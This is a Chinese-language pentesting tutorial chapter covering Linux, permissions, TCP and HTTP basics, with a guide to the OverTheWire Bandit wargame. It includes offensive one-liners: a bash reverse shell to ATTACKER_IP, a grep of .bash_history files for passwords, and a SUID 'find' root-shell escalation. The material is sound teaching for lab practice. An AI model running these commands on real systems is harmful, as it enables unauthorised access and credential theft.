# 第 1 章 · Linux 与网络基础

> 对应路线：**阶段 1**（3 周）
> 前置要求：**无**。会用鼠标会打字就行。
> 本章目标：能脱离鼠标在 Linux 里干活；看懂一次网络请求到底发生了什么。

---

## 0. 先搞懂三件事（读完全章再回来看）

| 概念 | 一句话解释 | 为什么重要 |
|---|---|---|
| **终端 / Shell** | 用文字命令操作电脑的界面 | 渗透测试 99% 时间在这里 |
| **Linux 文件系统** | 一切皆文件，从 `/` 开始的一棵倒树 | 找 flag、找配置全靠它 |
| **网络协议** | 电脑之间约定的说话方式（TCP/IP、HTTP） | 攻击的本质就是"用协议的方式骗协议" |

---

## 1. 基础概念（必读，别跳过）

### 1.1 什么是终端和 Shell

- **终端（Terminal）**：一个窗口，让你输入文字命令。
- **Shell**：在终端里解释你命令的程序，最常见的是 `bash`。
- **命令的通用格式**：

```bash
命令名  [选项]  [参数]
ls      -la     /home
```

- 选项（`-l`、`--help`）是"怎么干"；参数（`/home`）是"对谁干"。
- **空格是分隔符**，所以文件名带空格要转义：`cat my\ file.txt` 或 `cat "my file.txt"`。

**为什么渗透测试要用命令行？**

很多人第一次接触 Linux 会想："有图形界面为什么不用？"

因为：

1. **远程服务器没有图形界面**。你拿到的 shell 99% 是纯文本的。
2. **自动化能力**。一条命令可以处理一万个文件，图形界面点不过来。
3. **可脚本化**。所有操作都能写成脚本重复执行（渗透中极其重要）。
4. **信息密度高**。`ls -la` 一个命令给出的信息，图形界面要点好几下。

**理解"一切皆文件"**：

Linux 有个核心设计哲学：**设备、进程、网络连接，全都可以当作文件来读写**。

```bash
/dev/sda          # 硬盘
/dev/null         # 黑洞（写进去就丢弃）
/proc/cpuinfo     # CPU 信息（读这个文件就能看 CPU）
/proc/self/cmdline # 当前进程的命令行
/dev/tcp/127.0.0.1/8080   # 网络连接（bash 特性，可当文件读写！）
```

**这个特性在渗透中大有用处**——比如没有 `nc` 时，可以用 bash 自带的 `/dev/tcp` 发数据：

```bash
# 反弹 shell（不需要 nc）
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### 1.2 文件系统结构

```
/                    根目录，一切从这里开始
├── bin/             基本命令（ls、cat 等）→ 现代系统常软链到 /usr/bin
├── etc/             配置文件（/etc/passwd 存用户信息、/etc/shadow 存密码哈希）
├── home/            普通用户的家目录（/home/username）
├── root/            root 用户的家目录（普通用户进不去）
├── tmp/             临时文件，所有人可写（渗透常用作工作目录）
├── var/             变化的数据（日志在 /var/log）
├── usr/             用户程序（/usr/bin、/usr/share）
├── proc/            进程信息（虚拟文件系统，不占磁盘）
└── opt/             第三方软件
```

**重点**：Linux 里没有 C 盘 D 盘，所有东西都挂在 `/` 下面。

**渗透中必知的几个文件**：

| 路径 | 内容 | 为什么重要 |
|---|---|---|
| `/etc/passwd` | 用户列表（可读） | 枚举系统用户 |
| `/etc/shadow` | **密码哈希**（仅 root 可读） | 提权后拖走破解 |
| `/etc/hosts` | 本地 DNS 映射 | 了解内网结构 |
| `/etc/crontab` | 定时任务 | **提权常客** |
| `/root/.ssh/` | root 的 SSH 密钥 | 权限维持 |
| `/var/log/` | 各类日志 | 了解发生了什么 |
| `/home/*/.bash_history` | 用户命令历史 | **可能含密码！** |

```bash
# 实战：翻命令历史找密码（超常见）
cat /home/*/.bash_history | grep -iE "pass|mysql|ssh|ftp" 
```

### 1.3 权限：渗透的核心概念

```bash
$ ls -l /etc/passwd
-rw-r--r--  1 root root  2910 Jan  1 00:00 /etc/passwd
│└┬┘└┬┘└┬┘
│ │   │  └── 其他人权限：r--（只读）
│ │   └───── 所属组权限：r--（只读）
│ └───────── 所有者权限：rw-（读写）
└─────────── 文件类型：- 普通文件，d 目录，l 链接
```

**权限的数字表示**（重要，渗透中天天用）：

| 符号 | 数字 | 含义 |
|---|---|---|
| `r` | 4 | 读 |
| `w` | 2 | 写 |
| `x` | 1 | 执行 |
| `-` | 0 | 无权限 |

**所以 `rwx` = 4+2+1 = 7，`r-x` = 4+0+1 = 5，`r--` = 4**

```bash
-rwxr-xr-x   = 755   # 所有者全权限，其他人读+执行（常见于可执行文件）
-rw-r--r--   = 644   # 所有者读写，其他人只读（常见于普通文件）
-rwx------   = 700   # 只有所有者能动（常见于敏感脚本）
-rw-rw-rw-   = 666   # 所有人都能写（危险！）
```

```bash
chmod 755 file      # 改成 755
chmod +x file       # 加上执行权限
chmod -R 777 dir    # 递归改成全权限（危险操作）
chown user:group file   # 改所有者
```

**特殊权限位（渗透的重点）**：

除了普通的 rwx，还有三个**特殊位**：

| 位 | 名称 | 作用 | 危险点 |
|---|---|---|---|
| **SUID** | Set User ID | 执行时**临时获得文件所有者**的权限 | **提权入口** |
| **SGID** | Set Group ID | 执行时临时获得文件所属组权限 | 较小 |
| **Sticky** | 粘滞位 | 目录内文件只有所有者能删 | 一般无风险 |

**SUID 为什么是提权入口？重点理解**：

假设 root 写了一个程序 `/usr/bin/passwd`（用于改密码），并给它设了 SUID：

```
-rwsr-xr-x  root root  /usr/bin/passwd
   ↑
 这里本来是 x，变成 s 就表示 SUID
```

**效果**：当你（普通用户 alice）执行 `passwd` 时，这个进程会**以 root 身份运行**！
这正是 `passwd` 能修改 `/etc/shadow`（只有 root 能写）的原因。

**那为什么危险？**

如果这个 SUID 程序**有缺陷**（比如能执行任意命令、能读任意文件），
那么普通用户就能**借它获得 root 权限**。

```bash
# 实战：找出系统上所有 SUID 文件（提权第一步）
find / -perm -4000 -type f 2>/dev/null

# 输出示例：
# /usr/bin/passwd
# /usr/bin/sudo
# /usr/bin/find          ← 如果 find 有 SUID，可以直接拿 root！
# /usr/bin/vim

# 危险示例：如果 find 有 SUID
/usr/bin/find . -exec /bin/sh -p \; -quit   # 直接得到 root shell
```

> **记住这个思路**：SUID 让你"以别人的身份执行程序"。
> 只要这个程序能间接执行命令或读写文件，你就能"借道"获得更高权限。

**GTFOBins**：这是一个记录了"哪些程序有 SUID 时可以用来提权"的网站。
https://gtfobins.github.io —— 遇到 SUID 文件先来这里查。

---

### 1.4 网络基础（渗透的根基，务必理解）

> **为什么网络安全必须懂网络？**
> 因为所有的攻击都是"沿着网络路径"发生的：攻击者发一个包 → 经过若干设备 → 到达目标。
> 不理解这条路径，你就无法理解为什么某些攻击可行、某些不可行。

#### 1.4.1 IP 地址与端口

**IP 地址** = 设备在网络中的"门牌号"。

| 类型 | 范围 | 说明 |
|---|---|---|
| **公网 IP** | 除下列之外 | 全球唯一，可直接互访 |
| **私有 IP** | `10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16` | **内网**专用，不能直接公网访问 |

> **渗透意义**：内网地址（10.x、172.16-31.x、192.168.x）是**内网渗透的主战场**。
> 当你通过 SSRF 或隧道访问到 `127.0.0.1`、`192.168.x.x` 时，说明你进入了"内部"。

**端口** = 门牌号上具体的"门"。

```
IP 地址 : 端口
192.168.1.10 : 80        ← 相当于 "某某大厦 : 3 号门"
```

| 端口段 | 范围 | 说明 |
|---|---|---|
| 知名端口 | 0–1023 | 系统服务（需 root 才能绑定） |
| 注册端口 | 1024–49151 | 应用程序 |
| 动态端口 | 49152–65535 | 临时分配 |

**常见端口速记**：

| 端口 | 服务 | 渗透要点 |
|---|---|---|
| 21 | FTP | 匿名登录、弱口令 |
| 22 | SSH | 弱口令、私钥泄露 |
| 23 | Telnet | **明文传输**，抓包直接看到密码 |
| 25 | SMTP | 邮件伪造、用户枚举 |
| 53 | DNS | 区域传送、DNS 投毒 |
| 80/443 | HTTP/HTTPS | Web 攻击主战场 |
| 445 | SMB | 永恒之蓝、弱口令 |
| 3306 | MySQL | 弱口令、未授权 |
| 3389 | RDP | 远程桌面 |
| 6379 | Redis | **未授权访问**（经典） |
| 8080 | HTTP 备用 | Tomcat、Jenkins 等 |

#### 1.4.2 TCP 三次握手（为什么它重要）

**TCP 是"面向连接"的协议** —— 通信前先建立连接。这个过程叫**三次握手**：

```
客户端                                              服务器
  │                                                    │
  │  ① SYN  (seq=x)     "我想连接，我的序号是 x"        │
  │ ─────────────────────────────────────────────────>│
  │                                                    │
  │  ② SYN+ACK (seq=y, ack=x+1)                        │
  │     "收到，我也想连接，我的序号是 y，确认你的 x+1"   │
  │ <───────────────────────────────────────────────── │
  │                                                    │
  │  ③ ACK  (ack=y+1)   "确认收到你的 y+1"              │
  │ ─────────────────────────────────────────────────>│
  │                                                    │
  │  ═══════════ 连接建立，可以传数据了 ═══════════      │
```

**为什么三次，不是两次？**

两次不够：服务器发出 SYN+ACK 后，不知道客户端**是否收到了自己的序号**。
第三次 ACK 让服务器确认"客户端确实收到了我的 y"。这是双向确认的必然结果。

**渗透中的意义**：

| 现象 | 说明 |
|---|---|
| **端口开放** | 收到 SYN+ACK |
| **端口关闭** | 收到 RST（重置） |
| **端口被过滤** | 无响应（防火墙丢弃） |

```bash
# nmap 默认就是靠这三种响应判断端口状态
nmap -sS 192.168.1.10        # SYN 扫描（半开放，快且隐蔽）
nmap -sT 192.168.1.10        # 完整连接扫描（更容易被记录）
```

#### 1.4.3 HTTP 协议（Web 攻击的基础）

**HTTP 是"请求-响应"模型**：客户端发请求，服务器回响应。**无状态**（服务器不记得你是谁）。

**一个完整的 HTTP 请求**：

```http
GET /admin?user=alice HTTP/1.1        ← 请求行：方法 路径?参数 版本
Host: target.com                       ← 以下都是请求头
User-Agent: Mozilla/5.0
Cookie: session=abc123                 ← 身份凭据！
Content-Type: application/x-www-form-urlencoded
                                        ← 空行分隔
（GET 请求通常没有请求体）
```

**逐行解释**：

| 部分 | 说明 | 渗透关注点 |
|---|---|---|
| **请求行** | 方法 + 路径 + 参数 | **注入点常在这里**（`?user=`） |
| `Host` | 目标主机名 | Host 头攻击、密码重置投毒 |
| `User-Agent` | 客户端标识 | 可伪造；某些漏洞靠它触发 |
| `Cookie` | 会话凭据 | **越权/劫持的核心** |
| `Referer` | 来源页面 | 某些访问控制依赖它（可伪造） |
| `Content-Type` | 请求体格式 | 影响解析方式（可能绕过 WAF） |

**HTTP 方法**：

| 方法 | 用途 | 渗透关注点 |
|---|---|---|
| `GET` | 获取资源 | 参数在 URL 里，易注入 |
| `POST` | 提交数据 | 参数在请求体里 |
| `PUT` | 上传/替换资源 | 可能直接写文件！ |
| `DELETE` | 删除资源 | — |
| `OPTIONS` | 查询支持的方法 | 信息收集 |
| `PATCH` | 部分修改 | 可能绕过访问控制 |

> **技巧**：把 `GET` 改成 `POST`（或反过来）有时能绕过访问控制 ——
> 因为有些开发者只对其中一个方法做了检查。

**一个完整的 HTTP 响应**：

```http
HTTP/1.1 200 OK                        ← 状态行
Server: Apache/2.4.41                  ← 服务器软件（版本 = 线索！）
Set-Cookie: session=xyz789; HttpOnly    
Content-Type: text/html

<html>...</html>                       ← 响应体
```

**HTTP 状态码**：

| 码 | 含义 | 渗透中的意义 |
|---|---|---|
| **200** | 成功 | 找到了 / 访问成功 |
| **301/302** | 永久/临时跳转 | 看 `Location` 头，可能有开放重定向 |
| **401** | 未认证 | 需要登录 |
| **403** | 已认证但无权限 | **尝试绕过**（改头、改方法、改路径） |
| **404** | 不存在 | 爆破时的"噪声基线" |
| **405** | 方法不允许 | 试试其他 HTTP 方法 |
| **500** | 服务器内部错误 | **可能触发漏洞**（注入报错） |
| **502/503** | 网关/服务不可用 | 后端可能挂了 |

> **重要技巧：403 不代表没戏。**
> 403 说明"资源存在，但你没权限" —— 这本身是重要信息。
> 常见绕过：`X-Original-URL` 头、路径大小写、加 `/.` 、改成 POST 等。

**Cookie 与会话（极其重要）**：

HTTP 无状态，所以服务器用 **Cookie** 记住你：

```
① 你登录 → 服务器验证密码 → 生成 session ID → 通过 Set-Cookie 给你
   Set-Cookie: session=abc123

② 你后续每个请求都自动带上这个 Cookie
   Cookie: session=abc123

③ 服务器根据 abc123 查出"你是 alice"
```

**这就是为什么**：

- 拿到别人的 Cookie = **登录成别人**（Cookie 劫持）
- 改 Cookie 里的值可能**越权**（比如 `role=user` 改成 `role=admin`）
- XSS 攻击常用来**偷 Cookie**

**Cookie 的安全属性**：

| 属性 | 作用 | 渗透关注 |
|---|---|---|
| `HttpOnly` | JS 读不到这个 Cookie | **防 XSS 偷取**；没这个属性就能被偷 |
| `Secure` | 只在 HTTPS 下发送 | 防明文泄露 |
| `SameSite` | 限制跨站携带 | **防 CSRF**；`None` 则无防护 |
| `Path` | 限制发送路径 | — |

#### 1.4.4 用命令行"看见"网络

光看理论不够，要能**亲手观察**：

```bash
# 1. 看 HTTP 请求响应全过程（-v 显示详细）
curl -v http://example.com

# 2. 只看响应头
curl -I http://example.com

# 3. 不带 Cookie 访问（对比登录态差异）
curl http://target.com/admin
curl -H "Cookie: session=abc123" http://target.com/admin

# 4. 发 POST 请求
curl -X POST http://target.com/login \
     -d "username=admin&password=123456" \
     -H "Content-Type: application/x-www-form-urlencoded"

# 5. 抓包看原始流量（需要用 tcpdump/wireshark）
tcpdump -i any -A port 80        # -A 以 ASCII 显示内容
```

> **实践建议**：用 `curl -v` 观察一次完整的登录流程，
> 你会看到 Cookie 是怎么被设置的、后续请求是怎么带上它的。
> **这个理解是后面所有 Web 攻击的基础。**

---

## 2. 环境准备（10 分钟搞定）

### 2.1 进入 Kali 攻击容器

```bash
# 你的攻击环境（已配好所有工具）
docker exec -it kali bash
```

进去后你会看到类似 `root@xxxxx:/#` 的提示符。**这就是你的主战场。**

### 2.2 常用命令速记卡

```bash
# --- 看东西 ---
pwd                    # 我在哪
ls -la                 # 列出所有文件（含隐藏，含详情）
cat file.txt           # 看文件内容
less file.txt          # 分页看（q 退出，/ 搜索）
head -20 file.txt      # 看前 20 行
tail -20 file.txt      # 看后 20 行

# --- 找东西 ---
find / -name "flag*" 2>/dev/null     # 按名字找
grep -r "password" /etc 2>/dev/null  # 按内容找
which nmap                            # 命令在哪

# --- 处理文件 ---
cp a b                 # 复制
mv a b                 # 移动/改名
rm file                # 删除（-rf 强制递归，慎用！）
mkdir dir              # 建目录
tar -xzf a.tar.gz      # 解压
```

### 2.3 管道与重定向（极其重要）

```bash
# 管道 | ：把前一个命令的输出，当作后一个命令的输入
ls -la | grep ".txt"              # 只显示 txt 文件

# 重定向 > ：把输出写进文件（覆盖）
nmap -sV 10.0.0.1 > result.txt

# 重定向 >> ：追加
echo "新一行" >> result.txt

# 2>/dev/null ：把错误信息丢弃（清理输出）
find / -name flag 2>/dev/null
```

---

## 3. 主线实战：OverTheWire Bandit（34 关）

**网站**：https://overthewire.org/wargames/bandit/
**连接方式**（无需注册，密码就是 `bandit0`）：

```bash
ssh bandit0@bandit.labs.overthewire.org -p 2220
# 密码：bandit0
```

> 每过一关，**当前关的密码就是下一关的登录密码**。
> 建议：先本地登录去 `ssh bandit0@...`，过一关记一次密码。

### 关卡分组与知识点（逐关详解）

#### 🟢 第 0–5 关：文件与目录基本功

| 关 | 目标 | 关键命令 | 讲解 |
|---|---|---|---|
| 0 | 用 SSH 登录 | `ssh user@host -p port` | 记住 `-p` 指定非标准端口 |
| 1 | 读 `readme` 文件 | `cat` | `ls` 找到文件，`cat` 看内容 |
| 2 | 读文件名带 `-` 的文件 | `cat ./-` | `-` 会被当成选项，用 `./` 前缀规避 |
| 3 | 读带空格目录里的隐藏文件 | `ls -a`、`cd`、`cat` | `-a` 显示 `.hidden` 这类隐藏文件 |
| 4 | 找唯一的人类可读文件 | `file *` | `file` 判断文件类型，人类可读通常是 ASCII text |
| 5 | 找特定大小/权限的文件 | `find . -size 1033c ! -executable` | `find` 的组合条件 |

**第 1 关示例**：

```bash
bandit0@bandit:~$ ls -la
bandit0@bandit:~$ cat readme
# 输出的字符串就是 bandit1 的密码
```

**第 3 关示例**（文件名真的叫 `-`）：

```bash
bandit2@bandit:~$ ls
--spaces in this filename--
bandit2@bandit:~$ cat ./--spaces\ in\ this\ filename--
```

**第 5 关示例**：

```bash
bandit5@bandit:~$ find . -type f -size 1033c ! -executable
bandit5@bandit:~$ cat ./maybehere07/.file2
```

#### 🟡 第 6–10 关：查找、排序、编码

| 关 | 目标 | 关键命令 | 讲解 |
|---|---|---|---|
| 6 | 在整机找 owner=bandit7 的文件 | `find / -user bandit7 -group bandit6 -size 33c 2>/dev/null` | 全盘搜索 + 丢弃权限错误 |
| 7 | 在 `data.txt` 找 `millionth` 那行 | `grep millionth data.txt` | `grep` 按内容过滤 |
| 8 | 找只出现一次的那行 | `sort data.txt \| uniq -u` | `uniq -u` 只显示唯一行（必须先排序） |
| 9 | 找人类可读的 `=` 开头的串 | `strings data.txt \| grep =` | `strings` 从二进制里提可打印字符 |
| 10 | Base64 解码 | `base64 -d data.txt` | `-d` 是 decode |

**第 8 关讲解**（重要）：

```bash
sort data.txt | uniq -u
# uniq 只能去掉相邻重复行，所以必须先 sort
```

**第 10 关**：

```bash
bandit10@bandit:~$ base64 -d data.txt
# 输出明文密码
```

#### 🟠 第 11–15 关：编码变换与网络

| 关 | 目标 | 关键命令 | 讲解 |
|---|---|---|---|
| 11 | ROT13 解码 | `tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt` | ROT13 是字母位移 13 位 |
| 12 | 多次编码的文件 | `mktemp -d` + `xxd -r` + 反复 `file`/`gzip -d`/`bzip2 -d`/`tar` | 逆向一层层解 |
| 13 | 用 SSH 私钥登录 | `ssh -i sshkey.private bandit14@localhost -p 2220` | 私钥认证 |
| 14 | 把密码发给本地 30000 端口 | `cat /etc/bandit_pass/bandit14 \| nc localhost 30000` | `nc` 网络收发 |
| 15 | SSL 加密连接 | `openssl s_client -connect localhost:30001` | TLS 连接 |

**第 12 关讲解**（最考验耐心的一关）：

```bash
bandit12@bandit:~$ mkdir /tmp/work && cp data.txt /tmp/work/ && cd /tmp/work
bandit12@bandit:/tmp/work$ xxd -r data.txt > data.bin   # 十六进制转回二进制
bandit12@bandit:/tmp/work$ file data.bin                 # 看是什么格式
# 输出如：gzip compressed data → 改名后解压
bandit12@bandit:/tmp/work$ mv data.bin data.gz && gzip -d data.gz
# 反复 file → 改名 → 解压，直到是 ASCII text
bandit12@bandit:/tmp/work$ cat data
```

**口令卡**：`file` 说是啥就改成对应后缀 → `gzip -d` / `bzip2 -d` / `tar xf`。

#### 🔴 第 16–20 关：网络服务、定时任务

| 关 | 目标 | 关键命令 | 讲解 |
|---|---|---|---|
| 16 | 扫 31000–32000 找正确服务 | `nmap -p 31000-32000 localhost` | 识别 SSL vs 明文 |
| 17 | 找端口差异 | `nmap -sV`、`diff` | 对比响应差异 |
| 18 | 读 `.bashrc` 找密码 | `cat .bashrc`、`cat /etc/bandit_pass/bandit18` | 登录时被改写 |
| 19 | 定时任务漏洞：执行任意命令 | `ssh bandit18@... "cat readme"` | `ssh host "命令"` 直接跑命令 |
| 20 | 利用 cron + SUID 的 `bandit20` 程序 | 后台起 `nc -l`，用 setuid 程序连接 | SUID 提权经典题 |

**第 18 关的坑**：登录后立刻被踢（`.bashrc` 里 `exit`）。解法：

```bash
ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat readme"
# 在登录时直接执行命令，绕过交互式 shell
```

**第 20 关思路**：

```bash
bandit20@bandit:~$ ls
suconnect
bandit20@bandit:~$ ./suconnect
# 提示用法：读取本地端口，把密码发过去验证
bandit20@bandit:~$ echo "<bandit20的密码>" | nc -l -p 12345 &
bandit20@bandit:~$ ./suconnect 12345
```

#### 🟣 第 21–25 关：定时任务、文件权限、Git

| 关 | 目标 | 关键命令 | 讲解 |
|---|---|---|---|
| 21 | 读 cron 任务找密码来源 | `cat /etc/cron.d/*` | 定时任务可能以高权限跑 |
| 22 | 利用 cron 脚本 | 分析脚本逻辑 | 理解 crontab 字段 |
| 23 | 写文件到 cron 目录 | `echo "命令" > /path/xxx.sh` | CRON 提权 |
| 24 | 利用 cron 跑密码文件 | `cat /usr/bin/cronjob_*` | 配合 `chmod` / tar |
| 25 | `more` 分页器的逃逸 | `more file` 然后 `!/bin/sh` | 分页器可执行命令 |

**第 21 关示例**：

```bash
bandit21@bandit:~$ ls /etc/cron.d/
bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
# 看它执行的脚本，再 cat 那个脚本，跟着逻辑找到密码文件
```

#### ⚫ 第 26–33 关：进阶（Git、提权、Bash 逃逸）

| 关 | 目标 | 讲解 |
|---|---|---|
| 26 | `more` 分页器逃逸 | 登录后 `more` 某文件，按 `v` 进 vim，`:!sh` |
| 27 | Git 历史找密码 | `git log -p`、`git show` |
| 28 | Git 分支找密码 | `git branch -a`、`git checkout` |
| 29 | Git tag 找密码 | `git tag`、`git show <tag>` |
| 30 | Git 提交信息 | `git log` 里翻 |
| 31 | 在仓库里找 `key.txt` | `git ls-files`、`find` |
| 32 | 利用上层 `bandit32` 的 `sh` | 输入 `$0` 逃出受限 shell |
| 33 | 用 `bandit32` 的 SUID 环境 | 最终关，走完整提权链 |

### Bandit 学习记录表（自己填）

| 关 | 密码（本关） | 用到的命令 | 卡了多久 | 备注 |
|---|---|---|---|---|
| 0 | bandit0 | ssh | | |
| 1 | | | | |
| … | | | | |

> **重要**：不要抄别人的密码。抄了等于没学。卡住就看 `/etc/bandit_pass/banditXX` 自己验证。

---

## 4. 并行任务：TryHackMe 免费房间（8 个）

Bandit 是"纯命令行"，THM 补充"有界面的系统知识"。

### 4.1 如何启动 THM 靶机

```bash
# 1. 启动 VPN
bash ~/.thm/thm-vpn-up.sh

# 2. 浏览器打开房间，点「加入房间」→「启动靶机」
# 3. 拿靶机 IP：
curl -s -b cookies https://tryhackme.com/api/v2/vms/running | jq -r '.data[0].internalIP'
```

### 4.2 房间清单与学习点

| # | 房间 | 学什么 | 免费 |
|---|---|---|---|
| 1 | **Pre Security** 路径 | 计算机/网络/Web 基础 | ✅ |
| 2 | **Linux Fundamentals 1** | 文件、权限、用户 | ✅ |
| 3 | **Linux Fundamentals 2** | 管道、进程、包管理 | ✅ |
| 4 | **Linux Fundamentals 3** | 服务、日志、定时任务 | ✅ |
| 5 | **Windows Fundamentals 1** | Windows 界面与文件系统 | ✅ |
| 6 | **Windows Fundamentals 2** | 用户、注册表、服务 | ✅ |
| 7 | **Intro to LAN** | 局域网、DHCP、ARP | ✅ |
| 8 | **HTTP in Detail** | HTTP 请求/响应、Cookie | ✅ |

### 4.3 每个房间的标准流程

```bash
# 1. 起 VPN
bash ~/.thm/thm-vpn-up.sh
# 2. 建工作目录
mkdir -p ~/.thm/loot/<房间名> && cd ~/.thm/loot/<房间名>
# 3. 如果是机器类房间，扫端口
nmap -Pn -n -sV <IP> > detail.txt 2>&1
# 4. 做任务，回答问题
# 5. 记笔记，写 walkthrough
# 6. 关 VPN
bash ~/.thm/thm-vpn-down.sh
```

---

## 5. 阶段 1 实战小练习（检验是否真会了）

在 Kali 容器里完成以下任务（不需要靶机）：

```bash
docker exec -it kali bash

# 任务 1：创建目录结构并写文件
mkdir -p /tmp/lab/{a,b,c}
echo "secret123" > /tmp/lab/a/key.txt
# 找出所有含 secret 的文件
grep -r "secret" /tmp/lab

# 任务 2：练习管道
seq 1 100 | grep -E "7$" | wc -l        # 1-100 里以 7 结尾的有几个？

# 任务 3：权限实验
touch /tmp/lab/test.sh
chmod 755 /tmp/lab/test.sh
ls -l /tmp/lab/test.sh                   # 看权限变化

# 任务 4：找 SUID
find / -perm -4000 -type f 2>/dev/null | head

# 任务 5：HTTP 实战（本地起服务）
python3 -m http.server 9999 &
curl -v http://127.0.0.1:9999/
kill %1
```

---

## 6. 自测清单（全打勾才算过关）

- [ ] 能解释 `/etc/passwd` 每一列的含义
- [ ] 能用 `find` 按名字/大小/权限查找文件
- [ ] 能用 `grep` + 管道过滤内容
- [ ] 知道 `>` 和 `>>` 的区别
- [ ] 能读懂 `ls -l` 的权限位，知道 SUID 是什么
- [ ] 会用 `nc` 收发数据
- [ ] 会用 `openssl s_client` 连 TLS 服务
- [ ] Bandit 34 关全部通关
- [ ] 8 个 THM 免费房间全部完成
- [ ] 能说出 TCP 三次握手的三个步骤
- [ ] 能列出 HTTP 常见状态码（200/301/403/404/500）的含义

---

## 7. 卡住了怎么办

| 现象 | 排查 |
|---|---|
| `ssh` 连不上 bandit | 检查端口 `-p 2220`；用 `ssh -v` 看详细过程 |
| `find` 输出一堆 Permission denied | 加 `2>/dev/null` |
| 第 12 关解不出 | 老老实实 `file` 一次改一次名，别跳步 |
| `nc` 连了没反应 | 确认监听端口；`nc -v` 看连接状态 |
| THM 靶机 ping 不通 | THM 靶机禁 ICMP，直接 `nmap -Pn` |
| VPN 掉线 | `./down.sh && ./up.sh`（或对应脚本） |

---

## 8. 延伸学习（可选）

- **Bash 脚本入门**：把重复命令写成脚本，省时间。
- **tmux**：终端复用，跑长任务不怕断线。
- **man 手册**：`man find` 比任何教程都准。

```bash
# tmux 速记
tmux new -s work      # 新建会话
tmux attach -t work   # 重新连接
Ctrl+b d              # 脱离
```

---

## 9. 下一章预告

第 2 章是**整个路线的重心**：Web 渗透。
你会学到 SQL 注入、XSS、越权、文件上传等 30 类漏洞，
并在 **272 个免费在线实验**里逐个亲手打穿它们。

→ [02-web-pentesting.md](02-web-pentesting.md)

---

*本章文档位于 `runs/cyber-roadmap/docs/01-linux-and-network.md`*
